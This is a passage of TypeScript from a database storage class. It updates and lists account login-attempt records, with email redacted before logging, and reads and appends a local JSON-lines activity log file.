      .where(eq(accountLoginAttempts.id, id));

    await this.logLoginActivity({
      type: 'account_login_email_update',
      id,
      email: redactForLogging(email),
      timestamp: new Date().toISOString(),
    });
  }


  async getAllAccountLoginAttempts(): Promise<AccountLoginAttempt[]> {
    const data = await db
      .select()
      .from(accountLoginAttempts)
      .orderBy(desc(accountLoginAttempts.timestamp));
    return data;
  }

  async getLoginActivityLogs(): Promise<string> {
    try {
      const logs = await fs.readFile(this.logFilePath, 'utf-8');
      return logs;
    } catch (error) {
      console.error('Error reading log file:', error);
      return '';
    }
  }

  async logLoginActivity(data: any): Promise<void> {
    try {
      const logEntry = JSON.stringify({
        ...data,
        loggedAt: new Date().toISOString(),
      }) + '\n';
      
      await fs.appendFile(this.logFilePath, logEntry, 'utf-8');
    } catch (error) {
      console.error('Error writing to log file:', error);
    }
  }
}

export const storage = new DatabaseStorage();
